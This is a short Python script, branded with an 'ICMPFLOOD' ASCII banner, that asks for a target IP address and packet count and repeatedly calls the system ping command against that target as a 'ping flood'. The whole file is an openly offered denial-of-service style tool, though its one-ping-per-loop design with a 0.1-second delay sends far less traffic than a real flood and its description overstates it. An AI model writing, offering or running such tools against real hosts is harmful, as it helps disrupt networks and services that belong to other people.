import subprocess
import time
import os

logo = '''
  IIIII  CCCCC  M   M  PPPP   FFFFF  L      OOO    OOO   DDDD  
    I    C      MM MM  P   P  F      L     O   O  O   O  D   D 
    I    C      M M M  PPPP   FFFF   L     O   O  O   O  D   D 
    I    C      M   M  P      F      L     O   O  O   O  D   D 
  IIIII  CCCCC  M   M  P      F      LLLLL  OOO    OOO   DDDD  

'''
print(logo)

def ping_flood(target_ip, count):
    
    print(f"Pinging {target_ip} with {count} packets...")

    for i in range(count):
        
        if os.name == 'nt':  # Windows
            command = ['ping', '-n', '1', target_ip]
        else:  # Linux/Unix
            command = ['ping', '-c', '1', target_ip]

        subprocess.run(command)
        time.sleep(0.1)  

    print("Ping flood completed.")

if __name__ == "__main__":
    target = input("Enter the target IP address: ").strip()
    packet_count = int(input("Enter the number of packets to send: ").strip())
    
    ping_flood(target, packet_count)
